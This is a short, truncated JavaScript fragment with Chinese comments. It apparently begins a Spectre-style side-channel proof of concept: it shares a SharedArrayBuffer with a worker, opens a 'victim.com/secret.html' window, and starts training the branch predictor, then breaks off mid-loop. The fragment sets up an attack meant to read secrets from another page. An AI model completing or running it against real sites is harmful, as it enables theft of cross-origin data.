let view = new Uint8Array(sab);
let worker = new Worker('worker.js');
worker.postMessage(sab);

// 打开受害者窗口（假设同源，实际跨源需要特殊条件）
let victim = window.open('https://victim.com/secret.html');
setTimeout(() => {
    // 通过postMessage将SAB传递给受害者（需要同源）
    victim.postMessage(sab, '*');
}, 1000);

// worker.js
onmessage = function(e) {
    let sab = e.data;
    let view = new Uint8Array(sab);
    // 训练分支预测器
    for (let i = 0; i < 100; i++) {
